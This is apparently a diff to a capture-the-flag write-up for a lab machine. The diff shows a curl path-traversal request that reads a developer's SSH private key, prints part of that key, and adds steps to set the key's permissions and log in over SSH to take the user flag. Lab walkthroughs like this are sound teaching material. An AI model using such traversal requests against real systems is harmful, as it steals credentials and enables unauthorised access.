@@ -434,6 +434,7 @@ We want to login as developer and the best way to do this is by reading the priv
 ```bash
 curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
 ```
+
 This gets us the key, save it to a text file called id_rsa:
 ```bash
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -444,6 +445,18 @@ AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
 RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 ```
+Create a hidden ssh folder a move id_rsa to it and don't forget to change permissions of the key because it won't work if you do not do that:
+```bash
+chmod 600 id_rsa
+```
+Finally, ssh as developer and get the user flag, but keep in muind you could have gotten it before via the path traversal:
+```bash
+ssh -i .ssh/id_rsa developer@bedside.htb 
+```
+<img width="1917" height="540" alt="image" src="https://github.com/user-attachments/assets/f2f57462-7a1c-4c60-ace6-0163f40140d7" />
+
+
+
 
 
 
